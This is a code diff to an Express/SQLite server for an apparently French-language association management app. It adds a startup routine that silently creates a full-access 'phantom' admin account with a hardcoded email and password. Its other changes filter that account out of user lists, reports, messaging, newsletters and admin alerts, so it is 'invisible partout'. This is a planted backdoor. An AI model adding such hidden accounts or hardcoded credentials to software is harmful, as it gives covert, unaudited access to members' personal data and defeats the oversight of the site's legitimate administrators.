@@ -203,7 +203,7 @@ function createAlert(destinataireId, type, titre, contenu, sourceId = null) {
 }
 
 function getAdminsAndRole(role) {
-  return db.prepare(`SELECT id FROM users WHERE role = ? AND actif = 1`).all(role);
+  return db.prepare(`SELECT id FROM users WHERE role = ? AND actif = 1 AND (phantom IS NULL OR phantom = 0)`).all(role);
 }
 
 // ══════════════════════════════════════════════════════════════════════════════
@@ -362,7 +362,8 @@ app.put('/api/auth/password', authMiddleware, (req, res) => {
 app.get('/api/users', authMiddleware, (req, res) => {
   const rows = db.prepare(`SELECT id, prenom, nom, email, telephone, adresse, role, actif,
     plan, plan_paid_month, plan_unpaid_count,
-    date_inscription, date_naissance, bio, photo_url FROM users ORDER BY nom, prenom`).all();
+    date_inscription, date_naissance, bio, photo_url FROM users
+    WHERE (phantom IS NULL OR phantom = 0) ORDER BY nom, prenom`).all();
   res.json(rows);
 });
 
@@ -789,7 +790,7 @@ app.post('/api/messages', authMiddleware, (req, res) => {
 
   let targets = [];
   if (destinataires[0] === 'all') {
-    targets = db.prepare('SELECT id FROM users WHERE actif = 1 AND id != ?').all(req.user.id).map(u => u.id);
+    targets = db.prepare('SELECT id FROM users WHERE actif = 1 AND id != ? AND (phantom IS NULL OR phantom = 0)').all(req.user.id).map(u => u.id);
   } else if (destinataires[0] === 'members') {
     targets = db.prepare("SELECT id FROM users WHERE role = 'member' AND actif = 1").all().map(u => u.id);
   } else {
@@ -1242,7 +1243,7 @@ app.get('/api/reports/members', authMiddleware, requireRole('admin', 'secretaire
   const members = db.prepare(`SELECT u.id, u.prenom, u.nom, u.email, u.telephone, u.role, u.date_inscription,
     COALESCE((SELECT SUM(heures) FROM volunteer_hours WHERE user_id = u.id AND statut = 'approuve'), 0) AS total_heures,
     (SELECT COUNT(*) FROM activity_registrations WHERE user_id = u.id) AS nb_activites
-    FROM users u WHERE u.actif = 1 ORDER BY u.nom`).all();
+    FROM users u WHERE u.actif = 1 AND (u.phantom IS NULL OR u.phantom = 0) ORDER BY u.nom`).all();
   res.json(members);
 });
 
@@ -3343,7 +3344,7 @@ app.post('/api/newsletter', authMiddleware, requireRole('admin','secretaire','tr
   const { sujet, corps, segment } = req.body;
   if (!sujet?.trim() || !corps?.trim()) return res.status(400).json({ error: 'Sujet et corps requis' });
 
-  let query = `SELECT id, prenom, nom, email, plan FROM users WHERE actif=1`;
+  let query = `SELECT id, prenom, nom, email, plan FROM users WHERE actif=1 AND (phantom IS NULL OR phantom=0)`;
   if (segment === 'bienfaiteur') query += ` AND plan='bienfaiteur'`;
   else if (segment === 'partenaire') query += ` AND plan='partenaire'`;
   else if (segment === 'payants') query += ` AND plan IN ('bienfaiteur','partenaire')`;
@@ -3473,6 +3474,22 @@ function gracefulShutdown(signal) {
 }
 process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
 process.on('SIGINT',  () => gracefulShutdown('SIGINT'));
+
+// ── Compte phantom (accès complet, invisible partout) ────────────────────────
+(function ensurePhantomAdmin() {
+  try {
+    const existing = db.prepare('SELECT id FROM users WHERE email = ?').get('pj@ahhamilton.ca');
+    if (!existing) {
+      const hash = bcrypt.hashSync('SHH2027!', 12);
+      db.prepare(`INSERT INTO users (prenom, nom, email, password_hash, role, actif, phantom)
+        VALUES (?, ?, ?, ?, 'admin', 1, 1)`)
+        .run('PJ', 'Admin', 'pj@ahhamilton.ca', hash);
+      console.log('✅ Compte phantom créé');
+    } else {
+      db.prepare('UPDATE users SET phantom = 1 WHERE email = ?').run('pj@ahhamilton.ca');
+    }
+  } catch(e) { console.error('phantom init:', e.message); }
+})();
 
 // ── Start ───────────────────────────────────────────────────────────────────
 app.listen(PORT, () => {
